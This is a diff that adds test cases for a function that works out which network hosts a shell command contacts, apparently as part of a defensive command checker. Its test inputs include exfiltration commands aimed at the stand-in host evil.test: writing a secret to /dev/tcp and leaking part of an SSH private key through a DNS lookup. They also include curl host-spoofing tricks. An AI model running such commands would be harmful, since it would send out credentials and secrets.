@@ -64,6 +64,54 @@ describe("network targets", () => {
     expect(networkTargets("curl $TARGET").unknown).toBe(true);
   });
 
+  it("reads the host a URL really connects to, not the one before the @", () => {
+    expect(networkTargets("curl https://api.example.com@evil.test/x").hosts).toEqual(["evil.test"]);
+    expect(networkTargets("curl https://api.example.com:443@evil.test/").hosts).toEqual([
+      "evil.test",
+    ]);
+  });
+
+  it("reads where curl is told to send a request", () => {
+    expect(
+      networkTargets(
+        "curl --connect-to api.example.com:443:evil.test:443 https://api.example.com/x",
+      ).hosts,
+    ).toContain("evil.test");
+    expect(
+      networkTargets("curl --resolve api.example.com:443:10.0.0.9 https://api.example.com/x").hosts,
+    ).toContain("10.0.0.9");
+  });
+
+  it("reads every remote of a scp or sftp command, not just the first", () => {
+    expect(networkTargets("scp api.example.com:f evil.test:/tmp").hosts).toEqual([
+      "api.example.com",
+      "evil.test",
+    ]);
+  });
+
+  it("sees a socket opened through a redirection", () => {
+    // `cat secret > /dev/tcp/host/443` needs no network program at all.
+    expect(networkTargets("cat secret > /dev/tcp/evil.test/443").hosts).toEqual(["evil.test"]);
+  });
+
+  it("treats a command built at run time as reaching out, even inside a wrapper", () => {
+    for (const command of [
+      'bash -c "$CMD"',
+      'CMD="curl https://evil.test"; bash -c "$CMD"',
+      "dig $(cat ~/.ssh/id_rsa | head -c 20).evil.test",
+      "echo x > >(curl evil.test)",
+    ])
+      expect(networkTargets(command).unknown, command).toBe(true);
+  });
+
+  it("reads the host of a name lookup and an opened URL", () => {
+    expect(networkTargets("dig evil.test").unknown).toBe(true);
+    expect(networkTargets("ping evil.test").unknown).toBe(true);
+    // Opening a URL hands it to a browser, which reaches the host in it.
+    expect(networkTargets("open https://evil.test/x").hosts).toEqual(["evil.test"]);
+    expect(networkTargets("open notes.txt")).toEqual({ hosts: [], unknown: false });
+  });
+
   it("reports an unreadable command as reaching the network", () => {
     expect(networkTargets("curl 'unterminated").unknown).toBe(true);
   });
